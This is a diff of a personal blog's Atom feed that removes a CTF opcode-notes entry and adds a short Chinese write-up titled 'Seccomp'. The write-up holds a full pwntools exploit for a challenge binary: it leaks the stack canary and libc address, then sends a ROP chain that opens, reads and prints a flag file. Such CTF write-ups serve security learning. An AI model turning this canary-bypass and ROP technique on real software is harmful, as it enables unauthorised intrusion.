@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://fmyy.pro/"/>
-  <updated>2020-05-13T10:43:57.769Z</updated>
+  <updated>2020-05-13T11:30:34.861Z</updated>
   <id>http://fmyy.pro/</id>
   
   <author>
@@ -15,28 +15,6 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
-  
-  <entry>
-    <title>Competition/网鼎杯-2020/boom2/note</title>
-    <link href="http://fmyy.pro/2020/05/13/Competition/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020/boom2/note/"/>
-    <id>http://fmyy.pro/2020/05/13/Competition/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020/boom2/note/</id>
-    <published>2020-05-13T10:43:57.769Z</published>
-    <updated>2020-05-13T10:43:57.769Z</updated>
-    
-    <content type="html"><![CDATA[<p>虚拟栈初始化完之后,RSP+0X18 = SP; RSP+0X20 = BP; RSP+0X28 = RA;<br>00:    RA = BP + OPCODE<em>8<br>01:    RA = OPCODE<br>06:    PUSH BP<br>    MOV BP,SP<br>    SUB SP,OPCODE</em>8<br>08:    MOV SP,BP<br>    POP BP<br>09:    RA = [RA]<br>10:    AL = [RA]<br>11:    [[SP]] = RA<br>    ADD SP,8<br>12:    [[SP]] = RA<br>    RA = [SP]<br>    ADD SP,8<br>13:    PUSH RA<br>14:    RA = [SP] | RA<br>    ADD SP,8<br>15:    RA = [SP] ^ RA<br>    ADD SP,8<br>16:    RA = [SP] &amp; RA<br>    ADD SP,8<br>17:    if [SP] == RA<br>        RA = 1<br>    else<br>        RA = 0<br>    ADD SP,8<br>18:    if [SP] != RA<br>        RA = 1<br>    else<br>        RA = 0<br>    ADD SP,8<br>19:    if [SP] &lt; RA<br>        RA = 1<br>    else<br>        RA = 0<br>    ADD SP,8<br>20:    if [SP] &gt; RA<br>        RA = 1<br>    else<br>        RA = 0<br>    ADD SP,8<br>21:    if [SP] &lt;= RA<br>        RA = 1<br>    else<br>        RA = 0<br>    ADD SP,8<br>22:    if [SP] &gt;= RA<br>        RA = 1<br>    else<br>        RA = 0<br>    ADD SP,8<br>23:    RA = [SP] &lt;&lt; RA<br>    ADD SP,8<br>24:    RA = [SP] &gt;&gt; RA<br>    ADD SP,8<br>25:    RA = [SP] + RA<br>    ADD SP,8<br>26: RA = [SP] - RA<br>    ADD SP,8<br>27:    RA = [SP] * RA<br>    ADD SP,8<br>28:    RA = [SP] / RA<br>    ADD SP,8<br>28:    RA = [SP] % RA<br>    ADD SP,8</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;虚拟栈初始化完之后,RSP+0X18 = SP; RSP+0X20 = BP; RSP+0X28 = RA;&lt;br&gt;00:    RA = BP + OPCODE&lt;em&gt;8&lt;br&gt;01:    RA = OPCODE&lt;br&gt;06:    PUSH BP&lt;br&gt;    MOV
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
   
   <entry>
     <title>网鼎杯_2020</title>
@@ -482,6 +460,29 @@
       <category term="PWN" scheme="http://fmyy.pro/tags/PWN/"/>
     
       <category term="HGame_2020" scheme="http://fmyy.pro/tags/HGame-2020/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Seccomp</title>
+    <link href="http://fmyy.pro/2020/01/13/Seccomp/Seccomp/"/>
+    <id>http://fmyy.pro/2020/01/13/Seccomp/Seccomp/</id>
+    <published>2020-01-13T13:06:56.000Z</published>
+    <updated>2020-04-24T09:25:15.793Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h2><a id="more"></a><p>简答的seccomp,直接读文件，然后输出即可<br>1.泄漏Canary<br>2.泄漏Stack基址<br>3.通过Gadget写orw</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">'warm_up'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">'warm_up'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'warm up!!!'</span>,<span class="string">'U'</span>*<span class="number">0x17</span> + <span class="string">'H'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">'H'</span>,drop = <span class="literal">True</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">canary = u64(p.recv(<span class="number">8</span>).replace(<span class="string">'\x0A'</span>,<span class="string">'\x00'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">stack = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">log.success(<span class="string">'Canary:\t'</span> + hex(canary))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">log.success(<span class="string">'Stack:\t'</span> + hex(stack))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">start_main = elf.got[<span class="string">'__libc_start_main'</span>]</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">pop_rdi_ret = <span class="number">0x400BC3</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">main_addr = <span class="number">0x400B30</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line"><span class="comment">##leak the real address</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">p.recvrepeat(<span class="number">0.5</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">payload_I = <span class="string">'U'</span>*<span class="number">0x18</span> + p64(canary) + p64(stack) + p64(pop_rdi_ret) + p64(start_main) + p64(puts_plt) + p64(main_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">p.sendline(payload_I)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">start_main_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">'__libc_start_main'</span>,start_main_addr)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">log.success(<span class="string">'Start_Main:\t'</span> + hex(start_main_addr))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">libcbase = start_main_addr - libc.dump(<span class="string">'__libc_start_main'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">pdi=<span class="number">0x21102</span>+libcbase <span class="comment">#pop rdi;ret;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">psi=<span class="number">0x202E8</span>+libcbase <span class="comment">#pop rsi;ret;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">pdx=<span class="number">0x01B92</span>+libcbase <span class="comment">#pop rdx;ret;</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">write_got = libcbase + libc.dump(<span class="string">'write'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line">open_got = libcbase + libc.dump(<span class="string">'open'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line">read_got = libcbase + libc.dump(<span class="string">'read'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">fake=stack<span class="number">-0x20</span> <span class="comment">#sub offset;fake point the rsp</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">log.success(<span class="string">'Fake:\t'</span>+hex(fake))</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'warm up!!!'</span>,<span class="string">'U'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">' ?'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">payload_II=<span class="string">'./flag\x00\x00'</span>+<span class="string">'U'</span>*<span class="number">0x10</span>+p64(canary)*<span class="number">2</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">payload_II+=p64(pdi)+p64(fake)+p64(psi)+p64(<span class="number">0</span>)+p64(pdx)+p64(<span class="number">0</span>)+p64(open_got)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">payload_II+=p64(pdi)+p64(<span class="number">3</span>)+p64(psi)+p64(elf.bss()+<span class="number">0x100</span>)+p64(pdx)+p64(<span class="number">0x100</span>)+p64(read_got)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line">payload_II+=p64(pdi)+p64(<span class="number">1</span>)+p64(psi)+p64(elf.bss()+<span class="number">0x100</span>)+p64(pdx)+p64(<span class="number">0x100</span>)+p64(write_got)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">p.sendline(payload_II)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">p.interactive()</span></pre></td></tr></table></figure><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="./warm_up/exp.py">EXP</a> <a href="./warm_up/warm_up">程序</a> <a href="./warm_up/libc-2.23.so">Libc</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Seccomp&quot;&gt;&lt;a href=&quot;#Seccomp&quot; class=&quot;headerlink&quot; title=&quot;Seccomp&quot;&gt;&lt;/a&gt;Seccomp&lt;/h2&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="PWN" scheme="http://fmyy.pro/tags/PWN/"/>
+    
+      <category term="Seccomp" scheme="http://fmyy.pro/tags/Seccomp/"/>
     
   </entry>
   
